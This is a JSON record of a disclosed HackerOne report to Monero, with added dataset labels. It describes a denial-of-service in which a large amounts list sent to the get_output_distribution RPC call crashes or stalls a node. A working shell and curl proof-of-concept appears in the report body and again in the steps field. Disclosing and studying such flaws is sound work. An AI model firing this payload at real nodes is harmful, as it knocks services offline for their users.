{
    "reported_to": "Monero",
    "reported_by": "xfang ",
    "title": "RPC call crashes node",
    "content": "\nSummary:\nPassing a large list of amounts to the get_output_distribution call crashes a remote node, after maybe 90 seconds of keeping it busy.\nReleases Affected:\nProbably all\nSteps To Reproduce:\nCode 266 Bytes\n1values=`echo $(seq 0 500 900000)|sed -e 's/ /,/g'` ; curl http://127.0.0.1:38081/json_rpc -d '{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"get_output_distribution\",\"params\":{\"amounts\": ['$values'], \"from_height\": 100, \"cumulative\": false}' -H 'Content-Type: application/json'\nReduce the 900000 number a bit and instead of crashing the daemon, it'll do a denial of service, like 90 seconds per call, making it hard for anyone else to use that call.\nSupporting Material/References:\nUnnecessary. The attack is straightforward and compelling.\nHousekeeping\nPayment address: \u2588\u2588\u2588\u2588\nImpact\nAn attacker can crash any remote node that exposes get_output_distribution or tie up availability of that function call. I think that's serious.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": 5,
    "weaknesses": [
        "Uncontrolled Resource Consumption"
    ],
    "screenshots": {},
    "disclosed_date": 1660981260,
    "report_url": "https://hackerone.com/reports/1379707",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Generate a large list of values using a sequence command: `values=`echo $(seq 0 500 900000)|sed -e 's/ /,/g'`"
        ],
        [
            2,
            "Send a JSON-RPC request to the node with the large list of amounts: `curl http://127.0.0.1:38081/json_rpc -d '{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"get_output_distribution\",\"params\":{\"amounts\": ['$values'], \"from_height\": 100, \"cumulative\": false}' -H 'Content-Type: application/json'`"
        ]
    ],
    "vuln_description": "Passing a large list of amounts to the `get_output_distribution` RPC call crashes the node or causes a denial of service by keeping it busy for an extended period (e.g., 90 seconds per call). This allows an attacker to crash any remote node exposing this call or tie up its availability.",
    "reason": "The vulnerability involves a straightforward attack vector\u2014sending a large payload to an RPC endpoint\u2014which is a common and well-known type of attack (e.g., resource exhaustion). The interaction between the large input and the node's processing is predictable and does not require complex state manipulation or novel logic.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}